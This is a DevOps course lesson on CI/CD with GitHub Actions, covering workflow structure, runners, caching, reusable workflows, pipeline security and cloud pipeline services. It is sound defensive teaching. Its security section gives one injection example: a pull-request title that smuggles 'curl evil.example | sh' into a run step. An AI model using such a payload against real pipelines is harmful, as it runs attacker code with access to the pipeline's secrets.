## What you will be able to do

- Explain continuous integration, delivery and deployment, and what a good pipeline protects against.
- Read and write GitHub Actions workflows: triggers, jobs, steps, runners, `needs`, matrices and service containers.
- Make pipelines fast and cheap: caching, concurrency, path filters, timeouts.
- Reuse pipeline logic with reusable workflows and composite actions.
- Keep pipelines secure: least-privilege `permissions`, pinned actions, secrets and variables, untrusted pull requests.
- Compare GitHub Actions with the clouds' own pipeline services (AWS CodePipeline/CodeBuild, Azure Pipelines, Google Cloud Build).

## Why this matters at work

The pipeline is how every change reaches production, so it's the most important system a DevOps engineer owns. A good pipeline catches mistakes in minutes, gives every change the same checks, and leaves an audit trail of who shipped what. A bad one is slow (so people work around it), flaky (so people ignore it), or insecure (a compromised pipeline can push anything anywhere: software supply-chain attacks target pipelines on purpose). Job adverts for DevOps and platform roles almost always ask for GitHub Actions or GitLab CI experience, and interviews often include "walk me through your pipeline".

## 1. CI, CD and CD

- **Continuous integration (CI):** every change is built and tested automatically, on every push and pull request, so problems surface while they're small.
- **Continuous delivery:** every change that passes is ready to release; a person decides when (often a button or an approval).
- **Continuous deployment:** every change that passes goes to production automatically.

Most regulated companies, including banks, practise continuous **delivery** to production (with an approval step, topic 8.4) and continuous **deployment** to development and staging.

A pipeline should answer, for every change: **does it build, do the tests pass, is it secure, is it the artefact we tested, and who approved it going live?**

## 2. GitHub Actions in one picture

```text
workflow (.github/workflows/ci.yml)
 └── triggered by events: push, pull_request, schedule, workflow_dispatch (a button), workflow_call (reuse)
     └── jobs: run in parallel unless one `needs` another; each on a fresh runner (a VM)
         └── steps: shell commands (`run:`) or actions (`uses:`), in order, sharing the job's file system
```

You met a small workflow in topic 4.2. The course's pipeline lab (`labs/pipelines/.github/workflows/`) has three complete ones; this topic walks through `ci.yml`:

```yaml
name: ci
on:
  pull_request:
  push:
    branches: [main]
  workflow_call:                       # other workflows can call this one (section 5)

permissions:
  contents: read                       # least privilege for the built-in GITHUB_TOKEN

concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true             # a newer push to the same branch cancels the older run

jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15                # a hung job stops instead of burning minutes for 6 hours
    strategy:
      fail-fast: false
      matrix:
        python-version: ["3.12", "3.13"]   # the job runs once per value
    services:
      postgres:                        # a real database next to the job, as in topic 5.3
        image: postgres:17-alpine
        env: { POSTGRES_DB: itlpay, POSTGRES_USER: itlpay, POSTGRES_PASSWORD: ci-only-password }
        ports: ["5432:5432"]
        options: >-
          --health-cmd "pg_isready -U itlpay -d itlpay"
          --health-interval 5s --health-timeout 3s --health-retries 10
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python-version }}
          cache: pip                   # reuse downloaded packages between runs
      - run: pip install -r requirements-dev.txt
      - run: pytest -q
```

Things to notice:

- **`${{ ... }}`** are expressions: `github.ref` (the branch), `matrix.python-version`, `secrets.NAME`, `vars.NAME`, `steps.ID.outputs.NAME`.
- A **matrix** runs the same job across versions, operating systems or, in topic 8.4, clouds.
- **Service containers** give the job real dependencies (PostgreSQL, Redis) for integration tests.

## 3. Runners

| Runner | What it is | Use it for |
| --- | --- | --- |
| **GitHub-hosted** (`ubuntu-latest`, `windows-latest`, `macos-latest`) | A fresh VM per job, thrown away afterwards | Almost everything. Free minutes each month for private repositories; free for public ones |
| **Larger runners** | Bigger GitHub-hosted machines, paid per minute | Heavy builds |
| **Self-hosted** | Your own machine or VM running the runner agent | Access to private networks, special hardware, or to control cost at scale |

Self-hosted runners are dangerous on **public** repositories: anyone can open a pull request that runs code on your machine. Use them only for private repositories, run them as short-lived (ephemeral) VMs or containers, and never on a machine that holds other secrets. In the cloud, **Actions Runner Controller** runs ephemeral runners on Kubernetes.

## 4. Fast and cheap pipelines

| Technique | How |
| --- | --- |
| **Cache dependencies** | `actions/setup-python` with `cache: pip`, `actions/cache`, Docker layer cache (`cache-from: type=gha`, topic 8.2) |
| **Only run what changed** | `on: push: paths: ["infra/**"]` so a README edit doesn't run Terraform |
| **Cancel outdated runs** | `concurrency` with `cancel-in-progress: true` (but **never** for deployments: topic 8.4) |
| **Run jobs in parallel** | Independent jobs have no `needs`; a matrix splits tests |
| **Fail fast on cheap checks** | Lint and format first; long integration tests after |
| **Timeouts** | `timeout-minutes` on every job |

A pipeline that takes 40 minutes gets bypassed; aim for under 10 minutes for a pull request.

## 5. Reuse: reusable workflows and composite actions

Copying the same 80 lines into twenty repositories means fixing a bug twenty times. Two ways to share:

- **Reusable workflows** (`on: workflow_call`): a whole workflow called by others. The lab's `image.yml` starts with:

  ```yaml
  jobs:
    ci:
      uses: ./.github/workflows/ci.yml          # or org/shared-workflows/.github/workflows/ci.yml@v2
    build:
      needs: ci
  ```

  Platform teams publish shared workflows in one repository and pin callers to a version tag.
- **Composite actions**: a list of steps packaged as one `uses:` (an `action.yml` with `runs: using: composite`). Good for "set up our toolchain" steps used inside many jobs.

## 6. Securing the pipeline

Pipelines hold the keys to production, so attackers target them.

- **Least-privilege `permissions`** at the top of every workflow (`contents: read`), and widen per job only where needed (`packages: write`, `id-token: write`, `pull-requests: write`). Organisation settings can make read-only the default.
- **Pin third-party actions.** `uses: some-org/action@v3` follows a tag the owner can move. For actions outside GitHub and the big vendors, pin to a full **commit SHA** (`@8f4b7f84864484a7bf31766abe9204da3cbe65b3`) and let Dependabot propose updates. This has happened more than once: in March 2025 the tags of `tj-actions/changed-files` were moved to code that printed secrets into logs, and in March 2026 76 of the 77 tags of `aquasecurity/trivy-action` were moved to credential-stealing code. Pipelines pinned to a commit SHA were safe both times.
- **Secrets and variables:** store secrets in repository or **environment** secrets (`secrets.NAME`), never in the YAML. GitHub masks them in logs, but code you run can still leak them, so give each job only what it needs. Non-secret settings (account IDs, region names) go in **variables** (`vars.NAME`). Better still, use **no cloud secrets at all** with OIDC (topic 8.3).
- **Pull requests from forks** run with a read-only token and **no secrets**, on purpose. Don't "fix" that with `pull_request_target` plus checking out the fork's code: that runs untrusted code with your secrets, a well-known attack.
- **Untrusted input in `run:`**: an expression like `run: echo "${{ github.event.pull_request.title }}"` is pasted into the script before it runs, so a PR title of `"; curl evil.example | sh; "` becomes code. Pass such values through `env:` and use them as `"$TITLE"`.
- **Lint your workflows** with **actionlint**, which catches expression mistakes, unknown inputs and shell problems before you push.

## 7. The clouds' own pipeline services

| | AWS | Azure | Google Cloud |
| --- | --- | --- | --- |
| Build and test | CodeBuild | Azure Pipelines (YAML) | Cloud Build |
| Orchestrate stages | CodePipeline | Azure Pipelines stages and environments | Cloud Build triggers; Cloud Deploy for releases |
| Hosted repositories | CodeCommit (paused for new customers in 2024) | Azure Repos | Secure Source Manager |
| Where you'll meet it | AWS-only shops | Microsoft-centred companies, many banks | Google Cloud shops, especially for Cloud Run and GKE releases |

They all share the same ideas (triggers, stages, agents or runners, approvals, secrets), so what you learn with GitHub Actions transfers. An Azure Pipelines YAML file, for example, has `trigger`, `stages`, `jobs` and `steps`, almost the same shape.

## Practice

1. Copy `labs/pipelines/` (with the ITL Pay Lite files from `labs/itlpay-lite/`) into a new repository of your own, and make `ci.yml` pass on a pull request.
2. Break a test on purpose and watch the matrix: does one Python version fail, or both? Fix it.
3. Measure the effect of caching: note the `pip install` step's time with and without `cache: pip`.
4. Add a `lint` job with `ruff` that runs before `test` (use `needs`), and a path filter so README-only changes skip the workflow.
5. Run **actionlint** on your workflows (download the binary from its GitHub releases page, or `docker run --rm -v "$PWD":/repo -w /repo rhysd/actionlint:1.7.7`) and fix anything it reports. Then find one third-party action in your workflows and pin it to a commit SHA.

## Watch

English videos with English captions, checked on 2026-11-07. On itlearning.tech they play inside the lesson.

- [CI/CD Explained in 5 Minutes](https://www.youtube.com/watch?v=ddDJxFnv-qs) · TechWorld with Nana · 5 min. CI/CD in five minutes: the idea before the YAML.
- [Caching Dependencies to SPEED UP Workflows in GitHub Actions](https://www.youtube.com/watch?v=BDQivAobxKA) · CoderDave · 6 min. Caching dependencies to speed up workflows.
- [GitHub Actions Tutorial - Basic Concepts and CI/CD Pipeline with Docker](https://www.youtube.com/watch?v=R8_veQiYBjI) (optional, longer) · TechWorld with Nana · 32 min. GitHub Actions concepts and a full pipeline with Docker.

## Further learning (free)

Free, self-paced courses from the clouds that go with this topic. They're optional: use them to go deeper or to prepare for the certification exams. Sign in with a free Microsoft account for Microsoft Learn, a free AWS Builder ID for AWS Skill Builder, and a Google account for Google Skills (its courses are free; some hands-on labs use credits).

**Azure (Microsoft Learn):**

- [Introduction to GitHub Actions](https://learn.microsoft.com/training/modules/introduction-to-github-actions/)
- [Automate development tasks by using GitHub Actions](https://learn.microsoft.com/training/modules/github-actions-automate-tasks/)
- [Build continuous integration workflows by using GitHub Actions](https://learn.microsoft.com/training/modules/github-actions-ci/)
- [Maintain a secure repository by using GitHub best practices](https://learn.microsoft.com/training/modules/maintain-secure-repository-github/)

**AWS (AWS Skill Builder):**

- [Getting Started with DevOps on AWS](https://skillbuilder.aws/learn/R4B13K95YQ/getting-started-with-devops-on-aws/38NHHYRV1R)
- [AWS CodeBuild Getting Started](https://skillbuilder.aws/learn/QZEH96HXY6/aws-codebuild-getting-started/QVU1KBKFRZ)
- [AWS CodePipeline Getting Started](https://skillbuilder.aws/learn/YNKCTVMQ9M/aws-codepipeline-getting-started/UGBY22FZ6P)

**Google Cloud (Google Skills, formerly Cloud Skills Boost):**

- [DevOps Essentials](https://www.skills.google/course_templates/717)
- [Implement CI/CD Pipelines on Google Cloud](https://www.skills.google/course_templates/691)

